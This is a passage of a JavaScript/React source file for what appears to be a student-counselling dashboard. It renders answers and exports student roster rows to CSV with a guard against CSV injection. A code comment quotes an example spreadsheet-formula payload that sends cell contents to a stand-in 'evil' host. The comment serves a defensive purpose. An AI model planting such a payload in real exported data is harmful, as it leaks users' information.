          [file: {value.name}{value.status === "uploaded" ? " ✓" : ` (${value.status})`}]
        </span>
      );
    }
    // Generic nested object — fall back to compact JSON.
    return (
      <pre className="overflow-auto text-[10px] text-stone-600">
        {JSON.stringify(value, null, 2)}
      </pre>
    );
  }
  if (Array.isArray(value)) {
    if (value.length === 0) return <span className="italic text-stone-400">(empty)</span>;
    return (
      <ol className="list-decimal pl-4">
        {value.map((item, i) => (
          <li key={i} className="text-[11px]">
            <AnswerCell value={item} />
          </li>
        ))}
      </ol>
    );
  }
  return <span>{String(value)}</span>;
}

function Section({ title, children }) {
  return (
    <div>
      <p className="mb-2 text-[10px] font-semibold uppercase tracking-[0.2em] text-stone-600">{title}</p>
      {children}
    </div>
  );
}

const humanSize = (b) => {
  if (b == null) return "";
  if (b < 1024) return `${b} B`;
  if (b < 1024 ** 2) return `${(b / 1024).toFixed(0)} KB`;
  return `${(b / 1024 ** 2).toFixed(1)} MB`;
};

// CSV download for the visible roster rows. Common parent-meeting prep
// path. Uses RFC 4180 quoting (wrap fields in "..", escape any embedded
// double-quote by doubling it). Date stamps the filename so a counsellor
// downloading twice doesn't overwrite the first export.
function downloadStudentsCsv(rows) {
  if (!rows || rows.length === 0) return;
  const cols = [
    "student_id",
    "username",
    "display_name",
    "intake_complete",
    "file_count",
    "resume_count",
    "lead_name",
    "counsellor_name",
    "created_at",
    "updated_at",
  ];
  // CSV-injection guard. Excel / LibreOffice / Numbers all evaluate any
  // cell starting with =, +, -, @, tab, or carriage return as a formula
  // — which means a student-controlled display_name like
  //   =HYPERLINK("https://evil/?c="&A1, "click")
  // exfiltrates the row when a counsellor opens the export. Prefix
  // those with a single quote (the Excel convention to force literal-
  // text). Then standard RFC 4180 quoting on top.
  const FORMULA_LEAD = /^[=+\-@\t\r]/;
  const esc = (v) => {
    if (v == null) return "";
    let s = String(v);
    if (FORMULA_LEAD.test(s)) s = "'" + s;
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  const lines = [cols.join(",")];
  for (const r of rows) {
    lines.push(cols.map((c) => esc(r[c])).join(","));
  }
  const blob = new Blob([lines.join("\n")], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  const stamp = new Date().toISOString().slice(0, 10);
  a.download = `persona-students-${stamp}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
